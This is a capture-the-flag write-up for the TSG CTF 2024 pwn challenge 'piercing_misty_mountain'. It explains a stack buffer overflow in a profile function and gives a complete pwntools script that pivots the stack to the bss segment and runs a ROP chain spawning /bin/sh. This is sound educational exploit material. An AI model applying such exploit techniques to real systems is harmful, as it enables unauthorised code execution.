---
title: "piercing_misty_mountain - TSG CTF 2024"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "piercing", "misty", "mountain", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "In the profile function, we can overflow the job field and overwrite the RBP and return address:"
source:
  name: "CTFtime writeup #39725"
  url: "https://ctftime.org/writeup/39725"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "piercing_misty_mountain"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** piercing_misty_mountain
- **Author team:** blue-lotus
- **CTFtime:** <https://ctftime.org/writeup/39725>

---
In the `profile` function, we can overflow the job field and overwrite the RBP and return address:  
```C  
int profile() {  
char job[0x8] = "Job:";  
char age[0x8];  
printf("Job > ");  
read_n(job + 4, 0x18 - 4);  
printf("Age > ");  
read_n(age, 0x8);  
return atoi(age);  
}  
```  
So we can write our ROP in the bss segment by modifying the RBP to the bss segment address and returning to `0x401aab` (before calling read_n in the main function).  
Trigger the vulnerability in the `profile` again, set the return address to the address of the ROP in the bss segment, and the exploitation can be completed.  
Due to the static compilation of the program, it is very convenient to find available gadgets.  
```python  
from pwn import*  
context(log_level="debug", arch="amd64", os="linux")

context.terminal = ['tmux', 'splitw', '-h']  
# 0x00000000004075be : lea rsp, [rbp - 0x28] ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret  
# 0x0000000000401f34 : syscall  
# 0x000000000040217f : pop rdi ; ret  
# 0x000000000040a1ee : pop rsi ; ret  
# 0x000000000044afa2 : pop rdx ; ret  
# 0x0000000000450847 : pop rax ; ret  
def main():  
p=process("./piercing_misty_mountain")  
p.recvuntil(b'Name >')  
p.sendline(b'k4ra5u')  
p.recvuntil(b'Enter Your Age and Job')  
p.sendline(b'3')  
# gdb.attach(p)  
p.sendline(b'a'*4 + p64(0x4c9200) + p64(0x401AAB))  
p.sendafter(b'Age >',b'200')

pop_rdi = 0x000000000040217f  
pop_rsi = 0x000000000040a1ee  
pop_rdx = 0x000000000044afa2  
pop_rax = 0x0000000000450847  
syscall = 0x0000000000401f34

payload = b'a'*0x25 + b'/bin/sh\x00' + p64(pop_rdi) + p64(0x4c8228) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) +p64(syscall)  
p.sendline(payload)  
p.recvuntil(b'Enter Your Age and Job')  
p.sendline(b'3')  
p.sendline(b'a'*4 + p64(0x4c8228) + p64(0x4075be))

p.interactive()

if __name__ == "__main__":  
main()  
```
